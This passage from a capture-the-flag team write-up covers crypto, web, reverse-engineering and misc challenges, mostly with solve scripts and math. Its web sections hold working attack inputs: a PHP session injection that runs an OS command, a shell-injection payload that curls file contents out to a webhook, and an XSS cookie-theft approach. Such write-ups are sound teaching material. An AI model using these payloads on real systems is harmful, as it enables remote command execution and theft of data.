= b5 97 ea 80 93 fc 94 73 11 11 11 11 11 11 11 11 Submitting the collision pair to the netcat service, we have the flag. First blood!\n3k{1s_this_even_4_ha$h?_6b3c1686f7bf87} crypto warmup (Crypto; 353 points) Solved by TWY.\nPart I. Analysis Main Function:\nprint(B) # an integer array for i in range(0, len(flag), 3): print(do_magic(flag[i:i+3], B)) The function do_magic and the weird_function_1 called:\ndef weird_function_1(s): return sum([list(map(int,bin(ord(c))[2:].zfill(8))) for c in s], []) def do_magic(OooO, B): return sum(m * b for m, b in zip(weird_function_1(OooO), B)) Obviously B is given. Also, both the functions do_magic and weird_function_1 are deterministic, and the values fed to the argument OooO in the function do_magic are always three-letter strings (the last one may be shorter, but it is just equivalent to the three-letter string with null bytes padded after it), which means each 3-character string can be easily brute-forced. Also we can assume that all characters are ASCII printable (except the null bytes).\nPart II. Solve Script from tqdm import tqdm def weird_function_1(s): return sum([list(map(int,bin(ord(c))[2:].zfill(8))) for c in s], []) def do_magic(OooO, B): return sum(m * b for m, b in zip(weird_function_1(OooO), B)) B = [4267101277, 4946769145, 6306104881, 7476346548, 7399638140, 1732169972, 1236242271, 5109093704, 2163850849, 6552199249, 3724603395, 3738679916, 5211460878, 642273320, 3810791811, 761851628, 1552737836, 4091151711, 1601520107, 3117875577, 2485422314, 1983900485, 6150993150, 2045278518] F = [34451302951, 58407890177, 49697577713, 45443775595, 38537028435, 47069056666, 49165602815, 43338588490, 32970122390] flag = \u0026#34;\u0026#34; for i in F: for j in tqdm(range(128 ** 3)): a = j \u0026gt;\u0026gt; 14 b = (j \u0026gt;\u0026gt; 7) \u0026amp; 0b1111111 c = j \u0026amp; 0b1111111 if do_magic(chr(a) + chr(b) + chr(c), B) == i: flag += chr(a) + chr(b) + chr(c) break print(flag) Sample Output:\n53%|███████████████▊ | 1108550/2097152 [00:17\u0026lt;00:15, 62605.66it/s] 97%|█████████████████████████████ | 2030516/2097152 [00:31\u0026lt;00:01, 63928.93it/s] 90%|██████████████████████████▉ | 1881845/2097152 [00:32\u0026lt;00:03, 57390.00it/s] 88%|██████████████████████████▎ | 1840875/2097152 [00:32\u0026lt;00:04, 55971.72it/s] 86%|█████████████████████████▉ | 1809008/2097152 [00:31\u0026lt;00:05, 57432.73it/s] 90%|███████████████████████████ | 1890915/2097152 [00:26\u0026lt;00:02, 71159.66it/s] 84%|█████████████████████████▏ | 1758950/2097152 [00:24\u0026lt;00:04, 73218.48it/s] 91%|███████████████████████████▍ | 1915809/2097152 [00:26\u0026lt;00:02, 71046.21it/s] 98%|█████████████████████████████▎| 2048000/2097152 [00:35\u0026lt;00:00, 57756.23it/s] CTF{w4rmup-kn4ps4ck-ftw!} Total time: 254 seconds\nPart III. Extra Notes Actually time can be saved if we start from the lowercase character end instead.\na = 127 - (j \u0026gt;\u0026gt; 14) b = 127 - ((j \u0026gt;\u0026gt; 7) \u0026amp; 0b1111111) c = 127 - (j \u0026amp; 0b1111111) Sample Output:\n47%|██████████████▌ | 988601/2097152 [00:15\u0026lt;00:17, 63563.44it/s] 3%|█ | 66635/2097152 [00:01\u0026lt;00:34, 59598.76it/s] 10%|███▏ | 215306/2097152 [00:03\u0026lt;00:30, 60928.54it/s] 12%|███▊ | 256276/2097152 [00:04\u0026lt;00:30, 61312.85it/s] 14%|████▎ | 288143/2097152 [00:04\u0026lt;00:29, 60746.88it/s] 10%|███ | 206236/2097152 [00:03\u0026lt;00:29, 63268.73it/s] 16%|████▉ | 338201/2097152 [00:05\u0026lt;00:28, 61754.37it/s] 9%|██▋ | 181342/2097152 [00:02\u0026lt;00:31, 61100.82it/s] 2%|▋ | 49151/2097152 [00:00\u0026lt;00:33, 61221.49it/s] CTF{w4rmup-kn4ps4ck-ftw!} Total time: 37 seconds\nsecure roots (Crypto; 475 points) Solved by Mystiz.\nIn this challenge, there is a service that requires us to sign in. We are given a token for signing in as the guest, and the objective is to sign in as 3k-admin.\nTo be authenticated as $m$, one must provide an integer $r$ and a string $u$ such that\n\\[r^2 \\equiv \\text{SHA256}(m\\ \\|\\ u)\\ (\\text{mod}\\ n),\\]\nwhere $n$ is a product of two primes. The decryption algorithm is implemented below:\ndef decrypt(self, c): p, q = self.private mp = pow(c, (p+1)//4, p) mq = pow(c, (q+1)//4, q) _, yp, yq = xgcd(p, q) r = (yp * p * mq + yq * q * mp) % (self.public) return r def sign(self, m): U = os.urandom(20) c = int(hashlib.sha256(m + U).hexdigest(), 16) r = self.decrypt(c) return (r, int(U.hex(), 16)) The decryption algorithm is implemented in the same way as Wikipedia1 suggested. Does it mean that the signing algorithm is safe? No.\nFor Rabin cryptosystem, the ciphertext are quadradic residues because they are the square of their corresponding plaintexts. However, for the signing algorithm in the challenge, $h := \\text{SHA256}(m\\ \\|\\ u)$ is not necessarily a quadratic residue. In such cases, $r^2 \\not\\equiv h\\ (\\text{mod}\\ n)$.\nFor decrypt, we have $r \\equiv y_p\\cdot p\\cdot m_q + y_q\\cdot q\\cdot m_q\\ (\\text{mod}\\ n)$ with $y_p p + y_q q = 1$.\nTaking modulo $p$, we have $r \\equiv y_p\\cdot q\\cdot m_p\\equiv h^{(p+1)/4}\\cdot q\\cdot q^{-1}\\equiv h^{(p+1)/4} \\ (\\text{mod}\\ p)$. That said, $r^4 \\equiv h^{p+1}\\equiv h^2\\ (\\text{mod}\\ p)$. That implies $r^2 \\equiv \\pm h\\ (\\text{mod}\\ p)$. That implies $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ p)$. Likewise $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ q)$.\nAssuming that $r^2 - h\\equiv 0\\ (\\text{mod}\\ p)$ and $r^2 - h\\not\\equiv 0\\ (\\text{mod}\\ q)$, we have\n\\[\\gcd(n, r^2 - h) = p.\\]\nTherefore we are able retrieve a prime factor of $n$. After that, it is easy to forge tokens to sign in as 3k-admin and win the flag.\nCTF{f4ulty_s1gn4ture_f41l} online_compiler (Web; 425 points) Solved by ozetta.\nThe web service allows you to create a PHP file and execute a file in PHP or Python.\n@app.route(\u0026#39;/save\u0026#39;,methods = [\u0026#39;POST\u0026#39;]) @cross_origin() def save(): c_type=request.form[\u0026#39;c_type\u0026#39;] print(\u0026#39;ctype-(\u0026gt;\u0026#39;+c_type) if (c_type == \u0026#39;php\u0026#39;): code=request.form[\u0026#39;code\u0026#39;] if (len(code)\u0026lt;100): filename=get_random_string(6)+\u0026#39;.php\u0026#39; path=\u0026#39;/home/app/test/\u0026#39;+filename f=open(path,\u0026#39;w\u0026#39;) f.write(code) f.close() return filename else: return \u0026#39;failed\u0026#39; \u0026#34;\u0026#34;\u0026#34;elif (c_type == \u0026#39;python\u0026#39;): code=request.args.get(\u0026#39;code\u0026#39;) if (len(code)\u0026lt;30): filename=get_random_string(6)+\u0026#39;.py\u0026#39; path=\u0026#39;/home/app/testpy/\u0026#39;+filename f=open(path,\u0026#39;w\u0026#39;) f.write(code) f.close() return filename else: return \u0026#39;failed\u0026#39;\u0026#34;\u0026#34;\u0026#34; The file creation part is straightforward. It allows you to create a php file with length less than 100. The comment part looks suspicious and many players asked whether the challenge design is wrong. Because the file will be executed later, at a first glance I thought it is asking us to write a polygot for php and python. But apparently it is not the case:\n@app.route(\u0026#39;/compile\u0026#39;,methods = [\u0026#39;POST\u0026#39;]) @cross_origin() def compile(): c_type=request.form[\u0026#39;c_type\u0026#39;] filename=request.form[\u0026#39;filename\u0026#39;] if (c_type == \u0026#39;php\u0026#39;): if (filename[-3:]==\u0026#39;php\u0026#39;): if (check_file(\u0026#39;/home/app/test/\u0026#39;+filename)): path=\u0026#39;/home/app/test/\u0026#39;+filename cmd=\u0026#39;php -c php.ini \u0026#39;+path p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return \u0026#39;failed\u0026#39; else: return \u0026#39;noop\u0026#39; elif (c_type == \u0026#39;python\u0026#39;): if (filename[-2:]==\u0026#39;py\u0026#39;): if (check_file(\u0026#39;/home/app/test/\u0026#39;+filename)): cmd=\u0026#39;python3 \u0026#39;+filename p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return \u0026#39;failed\u0026#39; else: return \u0026#39;noop\u0026#39; The Python part got a filename checking, but interestingly instead of checking .py, it only checks py. As expected, the PHP part got a lot of restriction on disable_functions and disable_classes, so we cannot directly write a py file through functions like file_put_contents. By running array_diff with the list of disable_functions and get_defined_functions()[\u0026quot;internal\u0026quot;], it shows a bunch of session-related functions. So apparently we need to create a session file that is executable by Python. Somehow it is a kind of polygot as well...\nFinal payload:\n\u0026lt;?php session_id(\u0026#39;creepy\u0026#39;);session_start();$_SESSION[\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls /\u0026#39;)#\u0026#34;]=1; The session file it creates will look like this:\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls /\u0026#39;)#|i:1; The # is important to comment out the stuff afterwards. Then reuse the script in the UI:\n$.post(\u0026#34;http://\u0026#34;+location.hostname+\u0026#34;:5000/compile\u0026#34;, { c_type: \u0026#34;python\u0026#34;, filename: \u0026#34;../../../../tmp/sess_creepy\u0026#34; },function(data,status){ document.getElementById(\u0026#34;aab\u0026#34;).innerHTML=data; }) Emoji (Web; 438 points) Solved by ozetta.\nThe web service will fetch a list of images and sign them to get a MAC. A user can request downloading the image, which will trigger a command execution. At a first glance it needs trick like length extension attack to spoof the MAC but it is using hmac instead of pure sha256. But in fact it will sign any resource fetched by the service:\nfunction fetch_and_parse($page){ $a=file_get_contents(\u0026#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\u0026#34;.$page.\u0026#34;.html\u0026#34;); preg_match_all(\u0026#34;/\u0026lt;img src=\\\u0026#34;(.*?)\\\u0026#34;\u0026gt;/\u0026#34;, $a,$ma); return $ma; } And it could be spoofed like this:\nhttp://emoji.2021.3k.ctf.to/?dir=../../../ozetta/reponame/main/filename\nThe vulnerability is actually similar to this one 😏:\nhttps://web.archive.org/web/20201118140207/https://app.crackingthecryptic.com/sudoku/?puzzleid=..%2F..%2Fsudoku-sandbox-escape.appspot.com%2Fo%2Fpasswd\nThe difference is the challenge uses Github but CTC used Firebase previously, and both of them are serving the resource in the form https://domain/username/resource, so by using directory traversal, one can easily point the resource from the owner's account to the attacker's account.\nThen we can obtain a valid token by putting some images in the form of \u0026lt;img src=\u0026quot;...\u0026quot;\u0026gt; on the page. We can now go for the command execution part:\n$d = \u0026#34;bash -c \\\u0026#34;curl -o /dev/null \u0026#34;.escapeshellarg(\u0026#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\u0026#34;.$url).\u0026#34; \\\u0026#34;\u0026#34;; The bash -c is suspicious, and escapeshellarg only handles single quote but not double quote. By injecting double quote we can execute arbitrary commands:\n\u0026#34;;curl webhook -d z=$(grep 3k{ index.php|base64);#\u0026#34; Crackme (Reverse; 470 points) Solved by cdemirer, ozetta and Mystiz.\nThis writeup is written by Mystiz because cdemirer is busy having his exams. However, Mystiz knew almost nothing about the challenge.  Part I. Kickstarting the Challenge We are provided a VM-type binary where the instructions is also inscribed in the binary (stored in byte_1040). The first 64 bytes being:\n06 00 00 06 01 01 06 02 02 06 03 03 03 00 00 03 01 00 03 02 00 03 03 00 08 00 00 05 00 01 08 00 00 05 00 02 08 00 00 05 00 03 08 00 00 06 00 04 06 01 05 06 02 06 06 03 07 03 00 00 03 01 00 03 When we try to execute the binary, we are asked to enter the flag. Let's try to send something in:\n$ ./crackme Enter the flag: ctf{THi5_FL46_I5_lE91t_4ND_Y0UR_CHeCK3R_SUXx\u0026amp;} Good Job We are done!\nHowever, unfortunately, the scoreboard does not accept our flag... Why? Let's look at the binary in detailed.\nPart II. Reversing the Virtual Machine At suggested in sub_93A, each instruction consists of three bytes. The first byte is the opcode, and the rest are the parameters. There are 14 opcodes supported:\nInstruction Description ----------- ----------- 01 A B REG[A] *= B 02 A B REG[A] -= B 03 A B REG[A] = ~REG[A] 04 A B REG[A] ^= MEM[B] 05 A B REG[A] = REG[B] 06 A B REG[A] = MEM[B] 07 A B IF REG[0] != 0: IP += A 08 A B putc(REG[0]) 09 A B exit(REG[0]) 10 A B REG[0] = getc() 11 A B REG[A] \u0026lt;\u0026lt;= B \u0026amp; 0x1F 12 A B REG[A] \u0026amp;= MEM[B] 13 A B REG[A] |= MEM[B] 14 A B REG[A] += REG[B] There are 2137 bytes in byte_1040. The first 2048 bytes are the instructions and the remaining 89 bytes are the memory (first eight bytes being ba 91 8b 9a 8d df 8b 97). Moreover, there are four bytes for the register. Note that IP above represents the instruction pointer, which will be increased by 3 unless IP += A is triggered. Notably, IP never decreases.\nWith that, let's try to understand the first few instructions:\n06 00 00 REG[0] = MEM[0] // REG[0] = 0xba 06 01 01 REG[1] = MEM[1] // REG[1] = 0x91 06 02 02 REG[2] = MEM[2] // REG[2] = 0x8b 06 03 03 REG[3] = MEM[3] // REG[3] = 0x9a 03 00 00 REG[0] = ~REG[0] // REG[0] = 0x45 03 01 00 REG[1] = ~REG[1] // REG[1] = 0x6e 03 02 00 REG[2] = ~REG[2] // REG[2] = 0x74 03 03 00 REG[3] = ~REG[3] // REG[3] = 0x65 08 00 00 putc(REG[0]) // Prints \u0026#34;E\u0026#34; 05 00 01 REG[0] = REG[1] // REG[0] = 0x6e 08 00 00 putc(REG[0]) // Prints \u0026#34;n\u0026#34; ... Part III. Here Comes the Angry Solvers cdemirer made an Angr-compatible version and ran against Angr. He got a flag that passes the check in no time:\nctf{dsdsdddddddasdadsdsddaddddaddddddsddsssds} The flag is accepted in the original binary. However, the scoreboard does not accept it. What was happening? Let's look at the first instructions those are called since the binary is reading bytes (denote the bytes being x0, x1, ...) from the user.\n 186 | REG[0] = getc() // REG[0] = x0 189 | REG[0] ^= MEM[16] // REG[0] = x0 ^ 0x63 192 | REG[3] += REG[0] // REG[3] = x0 ^ 0x63 195 | REG[0] = getc() // REG[0] = x1 198 | REG[0] ~= REG[0] // REG[0] = x1 ^ 0xff 201 | REG[0] ^= MEM[17] // REG[0] = x1 ^ 0x74 204 | REG[3] += REG[0] // REG[3] = (x0 ^ 0x63) + (x1 ^ 0x74) 207 | REG[0] = getc() // REG[0] = x2 210 | REG[1] = REG[0] // REG[1] = x2 213 | REG[0] ^= MEM[18] // REG[0] = x2 ^ 0x8a 216 | REG[1] \u0026amp;= MEM[18] // REG[1] = x2 \u0026amp; 0x8a 219 | REG[1] \u0026lt;\u0026lt;= 1 // REG[1] = (x2\u0026lt;\u0026lt;1) \u0026amp; 0x14 222 | REG[2] = REG[1] // REG[2] = (x2\u0026lt;\u0026lt;1) \u0026amp; 0x14 225 | REG[1] += REG[0] // REG[1] = ((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a) 228 | REG[2] += REG[0] // REG[2] = ((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a) 231 | REG[1] \u0026amp;= MEM[19] // REG[1] = (((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10 234 | REG[2] |= MEM[19] // REG[2] = (((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10 237 | REG[1] += REG[2] // REG[1] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 240 | REG[0] = REG[1] // REG[1] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 243 | REG[3] = REG[1] // REG[3] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 246 | REG[0] = getc() // REG[0] = x3 249 | REG[1] = REG[0] // REG[1] = x3 252 | REG[1] ^= MEM[20] // REG[1] = x3 ^ 0x85 255 | REG[0] \u0026amp;= MEM[20] // REG[0] = x3 \u0026amp; 0x85 258 | REG[0] *= 2 // REG[0] = (x3 \u0026amp; 0x85) * 2 261 | REG[0] += REG[1] // REG[0] = ((x3 \u0026amp; 0x85) * 2) + (x3 ^ 0x85) 264 | REG[3] += REG[0] // REG[3] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) + ((x3 \u0026amp; 0x85) * 2) + (x3 ^ 0x85) Coincidentally, there is an assignment to REG[3] before each getc() operations. If we assume that those REG[3] to be zero, we will find something surprising. That is:\nx0, x1, x2, x3 = 0x63, 0x74, 0x66, 0x7b which reads ctf{. Eventually, if we proceed with the assumption, we have the flag: ctf{vErtu4l_m4chine_pr0tection_is_soo_2010_xD}. Fixing some of the spelling mistakes we have the actual flag:\nctf{v1rtu4l_m4chine_pr0tection_is_soo_2010_xD} The checks are not strict. There are non-unique solutions being accepted to the checker. Alas, the other reversing challenges we solved are checking our input in a similar fashion, too. This is not a good sign\u0026hellip;  Imposter (Web; 485 points) Solved by ozetta.\nI spent a lot of time in this question not because my bug-radar is not working but because of the broken bot. I have to keep being tortured by the unpleasant reCAPTCHA. I started this challenge at around 9:30 pm Saturday local time, and found the bug very quickly (?) in around 20 minutes:\nhttp://imposter.2021.3k.ctf.to/view/posts.php/?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 First, the token is specifying the post object created by the user. As expected the post content is sanitized. But the token handling part is funny:\nif (!empty($_GET[\u0026#39;token\u0026#39;])){ try {\t$result = unserialize(base64_decode($_GET[\u0026#39;token\u0026#39;]))-\u0026gt;get_post(); } catch (Error $e) { echo unserialize(base64_decode($_GET[\u0026#39;token\u0026#39;])); } } It will show the unserialized object when error occurs. You know a string does not have a method called get_post(), right? So just serialize a string and base64 encode it as the token and make arbitrary payload. But if we use the original view post page, it will be blocked by CSP:\nhttp://imposter.2021.3k.ctf.to/view/posts.php?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 which is due to the CSP created by \u0026lt;script src='../js/main.js'\u0026gt;\u0026lt;/script\u0026gt;. By using the Relative Path Overwrite (RPO, not ROP), we can get rid of that file. Note that both view//posts.php and view/posts.php/ work, but not /view/posts.php because /view/../js/main.js = /js/main.js is still valid while the other two will give view/js/main.js instead.\nAfter half an hour, I started bombard the author for the bot issue:\n\nOK things didn't go well. Let's try another author:\n\nFinally they took down the challenge to increase the resources at around 12:30 am Sunday local time. Maybe time to sleep? Well we decided to get some popcorn:\n\nThen I went to sleep at around 2 am. But I got woke up by my teammate later at 3:11 am to submit the payload:\n 🥶 Haiya time to sleep ar.\nBy the way, because the bot only accepts URL in the form view/posts.php?token={...}, we need to first use the meta refresh trick (which is not blocked by CSP) to kick the victim to the XSS page and steal the cookie. The detailed payload is left as an exercise for the readers.\nDigital (Crypto; 493 points) Solved by Mystiz.\nWe are given the parameters for digital signature algorithm (DSA):\n The modulus $p$ and the generator $g$ are around 2048 bits, and the order $q$ is 256 bits long.  On top of that, we are also given two pairs of DSA message-signature pairs, where the private key owner signs consecutively. One point worth noticing is that they are using a hand-crafted PRNG. The PRNG is seeded by 8 bytes from urandom:\nclass Random(): def __init__(self, seed): self.state = seed self.bits = self.state.bit_length() def next(self): self.state ^= self.state \u0026lt;\u0026lt; 76 self.state = rol(self.state, 32, self.bits) self.state ^= self.state \u0026gt;\u0026gt; 104 self.state = rol(self.state, 20, self.bits) self.state ^= self.state \u0026lt;\u0026lt; 116 self.state = rol(self.state, 12, self.bits) return self.state random = Random(int(os.urandom(8).hex(), 16)) Since their PRNG involves of xor's and rol's only, we can express the current and the next states (denoted by $k_1$ and $k_2$) explicitly:\n\\[\\begin{aligned} k_2 \u0026= \\text{ROL}(k_1, 64) \\oplus \\text{ROL}(k_1^{52..0}, 12) \\oplus \\text{ROL}(k_1^{24..0}, 32) \\\\ \u0026\\qquad \\oplus \\text{ROL}(k_1^{20..0}, 36) \\oplus k_1^{88..76} \\oplus k_1^{12..0} \\end{aligned}\\]\nWe can visualize the components for the next state in terms of the current state. We can see that $k_2^{128..64} = k_1^{64..0}$. That said, $k_1$ and $k_2$ share 64 bits of entropy, and they have 192 bits entropy in total.\n\nIn that way, we can write $k_1 := 2^{64} u + v$ and $k_2 := 2^{64} v + w$. Also, we have two pairs of message-signature pairs: $m_i$ and $r_i, s_i$'s which satisfy the below congruence (here $x$ is the secret flag):\n\\[k_is_i \\equiv h_i + xr_i\\ (\\text{mod}\\ q).\\]\nWe can eliminate $x$ by multiplying $r_2$ on the both sides of $k_1s_1 \\equiv h_1 + xr_1$ and multiplying $r_1$ on $k_2s_2 \\equiv h_2 + xr_2$. Eventually we can form a large congruence under modulo $q$:\n\\[k_1s_1r_2 - k_2s_2r_2 \\equiv h_1r_2 - h_2r_1\\ (\\text{mod}\\ q).\\]\nIn that way, the only unknowns are $k_1$ and $k_2$. Substituting $k_1 = 2^{64}u+v$ and $k_2 = 2^{64}v+w$, we have\n\\[2^{64}s_1r_2u + (- 2^{64}s_2r_1 + s_1r_2)v - s_2r_1w \\equiv h_1r_2-h_2r_1\\ (\\text{mod}\\ q).\\]\nWe can construct a lattice and use the LLL algorithm to find short vectors. The vector we want is $(0, -1, u, v, w)$.\nb = h1*r2 - h2*r1 a0 = 2**64 * s1*r2 a1 = -2**64 * s2*r1 + s1*r2 a2 = -s2*r1 A = Matrix(ZZ, [ [ b, 1, 0, 0, 0], # \u0026lt;- -1 [a0, 0, 1, 0, 0], # \u0026lt;- u (64 bits) [a1, 0, 0, 1, 0], # \u0026lt;- v (64 bits) [a2, 0, 0, 0, 1], # \u0026lt;- w (64 bits) [ q, 0, 0, 0, 0], # * ]) Q = diagonal_matrix([2**64, 2**64, 1, 1, 1]) A *= Q A = A.LLL() A /= Q We are able to retrieve the flag with the above Sage snippet - and we agreed that we should not roll our own PRNG algorithms.\n3k{Why_roll_your_0wn_random_???} Mokdad's Memories (Misc; 498 points) Solved by TWY.\nPart I. Analysis We are given a Python source code that takes el_mok.png as the input and outputs an image named brain_memory.png, and a remote service nc mokdadkey.2021.3k.ctf.to 1777.\nAs the source code states that the dimension of brain_memory.png is $887\\times499$, while the given brain_memory.png is $887\\times22$, probably something has been done to the original brain_memory.png.\n It may be a cropped part of the \u0026quot;brain memory\u0026quot;, or The dimension may be corrupted, or Other reason(s) that needs further investigation  In either of the first two cases, we know that the relative offsets between the pixels of the visible parts ($887\\times22$) are fixed.\nSince the given brain_memory.png can be loaded in MSPaint, but result in Internal Error in SAI2, we can deduce that the file has some sorts of errors.\nTo allow the file to be loaded by Python PIL library properly, we can use some more tolerant image editing software (e.g. GIMP / paint.net) that preserves transparency to open the file, then export to another png file for our use (suppose that the challenge does not have steganography involved, as stated in Home - About).\n This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something\u0026hellip;?  Part II. Reversing the Source Code Since the source code is given, we can try to reverse all the steps to obtain part(s) of the el_mok.png.\n# Source fffmok.save(\u0026#34;brain_memory.png\u0026#34;) # Reverse fffmok = Image.open(\u0026#34;brain_memory.png\u0026#34;)# Source fffmok = Image.new(\u0026#34;RGBA\u0026#34;, (887, 499)) pixels = fffmok.load() itr = 0 for y in range(887): # Brain of Mekdad is so old not knowing how to save his memories :-( for x in range(499): pixels[y, x] = fffmok_pixels[itr] itr += 1 # Reverse fffmok_pixels = [] for y in range(887): for x in range(499): fffmok_pixels.append(fffmok.getpixel((y, x))) # or shorter: fffmok_pixels = [fffmok.getpixel((y, x)) for y in range(887) for x in range(499)] # or even: from PIL.Image import TRANSPOSE fffmok.transpose(TRANSPOSE).tobytes() # notice that this method produces a byte-string instead of a tuple array, so there are some changes needed in order to have the solve script compatible with this.# Source key = bytes_to_long(b\u0026#34;REDACTED\u0026#34;) # Mekdad will give you the key fffmok_pixels = [] for i in range(0, len(ffmok_bytes) - 4, 8): p = bytes_to_long(ffmok_bytes[i:i+8]) v = (key ^ p) % 18446744073709551615 o2 = v \u0026amp; 0xff b2 = (v \u0026gt;\u0026gt; 8) \u0026amp; 0xff g2 = (v \u0026gt;\u0026gt; 16) \u0026amp; 0xff r2 = (v \u0026gt;\u0026gt; 24) \u0026amp; 0xff o1 = (v \u0026gt;\u0026gt; 32) \u0026amp; 0xff b1 = (v \u0026gt;\u0026gt; 40) \u0026amp; 0xff g1 = (v \u0026gt;\u0026gt; 48) \u0026amp; 0xff r1 = (v \u0026gt;\u0026gt; 56) \u0026amp; 0xff fffmok_pixels.append((r1, g1, b1, o1)) fffmok_pixels.append((r2, g2, b2, o2)) fffmok_pixels.append(tuple(ffmok_bytes[-4:])) This part transforms the bytes using the xor-mod operation using the key.\nFor the key, it states that Mekdad will give you the key. So we should use the netcat service to ask Mekdad for the key.\n$ nc mokdadkey.2021.3k.ctf.to 1777 My number \u0026#39;n\u0026#39; is 1 \u0026lt;= n \u0026lt;= 168 You have 8 tries to guess the right number! Guess\u0026gt; 84 My number is smaller than 84 Guess\u0026gt; 42 My number is smaller than 42 Guess\u0026gt; 21 My number is smaller than 21 Guess\u0026gt; 10 My number is smaller than 10 Guess\u0026gt; 5 Correct, Me Mekdad Shili the President of the Artists Syndicate! As promised here is my secret: \u0026#39;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\u0026#39; A simple binary search can solve this, as the number of guesses allowed seems to be calculated by $\\lceil \\log_2n\\rceil$.\nSo here we obtained the key: _D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_. (without the single quotation marks, can be confirmed in later stage if we find the final image looks like random noises).\nThe next problem is to reverse the v = (key ^ p) % 18446744073709551615 part, where $18446744073709551615 = 2^{64}-1$, and $p$ is 64-bit.\nWhich means that $\\text{key} \\oplus p$ only differs from $\\text{key}$ in the lower 64 bits. Therefore, the lower bound of $\\text{key} \\oplus p$ is the result of changing all the lower 64 bits of $\\text{key}$ to 0.\nSince $v$ is the given remainder after the modulo operation, so $\\text{key} \\oplus p$ should be the next number $\\geq$ lower bound that have a remainder of $v$ after divided by $18446744073709551615$. (Actually there are two possible $p$'s if the lower bound satisfies $v$ (then the upper bound also), but the probability is neglectably low so we can just ignore that :) )\n# Reverse key = bytes_to_long(b\u0026#34;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\u0026#34;) key_mask_length = (18446744073709551615).bit_length() # 64 key_low64 = key \u0026amp; (2 ** key_mask_length - 1) key_mask64 = key ^ key_low64 ffmok_bytes = b\u0026#34;\u0026#34; for i in range(0, len(fffmok_pixels) - 1, 2): r1, g1, b1, o1 = fffmok_pixels[i] r2, g2, b2, o2 = fffmok_pixels[i + 1] v = bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2])) p = ((key_mask64 - (key_mask64 - v) % 18446744073709551615) + 18446744073709551615) ^ key # assert (p ^ key) % 18446744073709551615 == v ffmok_bytes += p.to_bytes(8, \u0026#34;big\u0026#34;) ffmok_bytes += bytes(fffmok_pixels[-1])# Source fmok_bytes = b\u0026#34;\u0026#34;.join(map(bytearray, fmok_pixels)) k = (int(\u0026#34;\u0026#34;.join([hex(_)[2:] for _ in iv]), 16) ** 4).to_bytes(32, \u0026#34;little\u0026#34;) # b\u0026#39;\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01\u0026#39; iv = b\u0026#39;\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF\u0026#39; aes = AES.new(k, AES.MODE_CBC, iv) ffmok_bytes = aes.encrypt(fmok_bytes[:-4]) + fmok_bytes[-4:] # Reverse k = b\u0026#39;\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01\u0026#39; iv = b\u0026#39;\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF\u0026#39; aes = AES.new(k, AES.MODE_CBC, iv) fmok_bytes = aes.decrypt(ffmok_bytes[:-4]) + ffmok_bytes[-4:] fmok_pixels = [[fmok_bytes[i+j] for j in range(8) if i + j \u0026lt; len(fmok_bytes)] for i in range(0, len(fmok_bytes), 8)] Notice that k is the \u0026quot;iv (in big endian) raised to the 4th power (i.e. squared twice)\u0026quot; in little endian.\nTherefore, the iv can be recovered by:\niv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, \u0026#39;little\u0026#39;)))))) # iv = tuple(b\u0026#34;ASDFQWER\u0026#34;)# Source iv = (X, X, X, X, X, X, X, X) # Of course it\u0026#39;s REDACTED prev = iv fmok_pixels = [] for i in range(0, len(mok_bytes), 8): prev = tuple(map(lambda x, y: x ^ y, mok_bytes[i:i+8], prev)) fmok_pixels.append(prev) # Reverse iv 